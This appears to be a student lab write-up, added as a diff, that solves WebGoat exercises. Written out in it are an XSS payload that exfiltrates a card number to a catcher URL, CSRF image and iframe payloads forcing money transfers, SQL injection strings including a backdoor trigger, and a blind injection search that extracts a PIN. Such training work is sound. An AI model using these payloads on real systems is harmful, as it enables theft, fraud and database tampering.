@@ -1,0 +1,67 @@
+Part 1 Explanation:
+    In this part, first i worte </form> to end the last form, then I wrote a new form with
+    three components: username, password and submit button, while click on the button, it
+    will trigger the function hack(), which will get the value of the form and generate
+    the fake post image URL and send the URL to the server to complete a hacking.
+
+Part 2 Explanation:
+    unencoded URL:
+    http://localhost:8090/WebGoat/start.mvc#attack/297061215/900?input1=123&input2=<script>document.form.buy.setAttribute('onclick', 'hack()');var input2 = document.getElementsByName("input2");input2.style.display = "none";var messageDiv = document.getElementById("message");messageDiv.style.display = "none";function hack() {var XssImage = new Image();var value = document.getElementsByName("input1")[0].value;XssImage.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + value;}</script>
+    script:
+    <script>
+        document.form.buy.setAttribute('onclick', 'hack()');
+        var messageDiv = document.getElementById("message");
+        var input2 = document.getElementsByName("input2");
+        input2.style.display = "none";
+        messageDiv.style.display = "none";
+
+        function hack() {
+            var XssImage = new Image();
+            var value = document.getElementsByName("input1")[0].value;
+            XssImage.src = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=" + value;
+        }
+    </script>
+    the "enter your three digit code" area exploitable, through the java script, I change the visibility of the message and
+    input2 area into none, so they won't appear. and to get the credit card number, i use document.getElementsByName("input1")[0]
+    to get it, and using the number, i concat it with the url and send a post request.
+
+Part 3 Explanation:
+    I wrote an image loading expression, which contains the url that is needed to perform an exploit, and I wrote the exploit
+    text into message area.
+    <img src="http://localhost:8090/WebGoat/attack?Screen=1430709817&menu=900&transfer=5000" height="1" width="1">
+
+Part 4 Explanation:
+    In this part, I used two ifrmes to generate two request, when the first frame loaded, it will trigger the second one to generate
+    the confirm request, which is http://localhost:8090/WebGoat/attack?transfer=CONFIRMED. after doing that, I can achieve a successful
+    attack.
+
+Part 5 Explanation:
+    In this part, I wrote a javascript function and when iframe1 is loading, the function will get the token inside iframe1 and
+    concact it with original url to get a successful attack.
+
+Part 6 Explanation:
+    in this part, i construct the select as: SELECT * FROM user_data WHERE last_name = '' or 1 = 1 --' which will make every search
+    being true, and it will display all the content in the table.
+
+Part 7 Explanation:
+    for stage 1, i used a ';' to separate the first sentence with the second one. and it will replace the salary with 999. and for the
+    second stage, i wrote CREATE TRIGGER backDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='ece568_22s@utoronto.ca' WHERE userid = NEW.userid;
+    after 101; and it will cause an success attack
+
+
+Part 8 Explanation:
+    101 AND (SELECT pin FROM credit WHERE cc_number='1234123412341234') < 2500;
+    2500~5000 --> 3750
+    2500~3750 --> 3125
+    3125~3750 --> 3437
+    3125~3437 --> 3281
+    3281~3437 --> 3359
+    3281~3359 --> 3320
+    3281~3320 --> 3300
+    3300~3320 --> 3310
+    3310~3320 --> 3315
+    3315~3320 --> 3317
+    3317~3320 --> 3318
+    101 AND (SELECT pin FROM credit WHERE cc_number='1234123412341234') = 3318
+    then the response from the sever said: Account number is valid. so the pin is 3318
+
